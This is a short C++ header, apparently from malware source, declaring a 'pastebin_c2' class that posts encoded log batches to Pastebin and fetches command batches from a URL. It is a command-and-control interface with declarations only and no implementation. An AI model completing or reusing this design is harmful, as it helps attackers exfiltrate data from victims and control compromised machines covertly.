#ifndef PASTEBIN_H
#define PASTEBIN_H

#include "comm.h"
#include "crypto.h"
#include "protocol.h"
#include <string>
#include <vector>


class pastebin_c2 {
public:
    pastebin_c2(Comm* comm_module, crypto_encoder* encoder);
    
    // Posts a log batch to Pastebin
    pastebin_c2(Comm* comm_module, crypto_encoder* encoder, const std::wstring& base_url);
    
    std::string post_logs(const LogBatch& logs);
    CommandBatch fetch_commands(const std::wstring& url);

private:
    void sync_time();

    Comm* comm_module;
    crypto_encoder* encoder;
    std::time_t last_synced_time;
    std::wstring base_url;
};

#endif // PASTEBIN_H
